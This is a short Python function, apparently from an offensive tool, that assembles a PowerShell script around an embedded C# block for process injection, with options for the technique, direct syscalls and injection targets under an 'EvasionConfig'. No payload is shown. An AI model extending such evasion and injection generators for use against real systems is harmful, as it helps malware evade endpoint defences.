def _generate_powershell(config: EvasionConfig) -> str:
    technique = config.inject or "createthread"
    use_syscalls = config.syscalls is not None
    target = config.inject_target
    target_list = _DEFAULT_TARGETS

    parts: list[str] = []
    parts.append(_ps_csharp_block(technique, use_syscalls, target, target_list))
    parts.append(_ps_wrapper(technique))
    return "\n".join(parts)


